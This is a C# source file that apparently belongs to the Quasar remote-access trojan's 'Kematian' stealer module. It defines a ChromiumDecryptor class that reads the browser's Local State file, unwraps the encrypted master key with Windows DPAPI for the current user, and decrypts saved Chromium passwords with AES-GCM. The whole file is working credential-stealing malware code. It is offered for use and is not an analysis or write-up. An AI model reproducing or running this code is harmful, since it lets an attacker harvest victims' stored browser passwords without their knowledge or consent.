﻿using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Kematian.HelpingMethods.Decryption
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            //try
            //{
            if (File.Exists(localStatePath))
            {
                string localState = File.ReadAllText(localStatePath);

                var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
                var endIndex = localState.IndexOf('"', startIndex + 1);
                var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);

                _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                    DataProtectionScope.CurrentUser);
            }
            //}
            //catch (Exception e)
            //{
            //    Debug.WriteLine(e);
            //}
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                if (string.IsNullOrEmpty(cipherText))
                    return "";

                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);

                var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
                var encryptedData = cipherTextBytes.Skip(15).ToArray();

                // Separate the actual encrypted data from the auth tag
                var actualEncryptedData = encryptedData.Take(encryptedData.Length - 16).ToArray();
                var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

                var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);

                return Encoding.UTF8.GetString(decryptedPassword);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
                return "";
            }
        }

        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce, byte[] authTag)
        {
            const int KEY_BIT_SIZE = 256;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
            if (encryptedPassword == null || encryptedPassword.Length == 0)
                throw new ArgumentException("Message required!", nameof(encryptedPassword));

            AesGcmBetter AES = new AesGcmBetter();
            var output = new byte[0];

            try
            {
                output = AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
                return null;
            }
            return output;
        }
    }
}

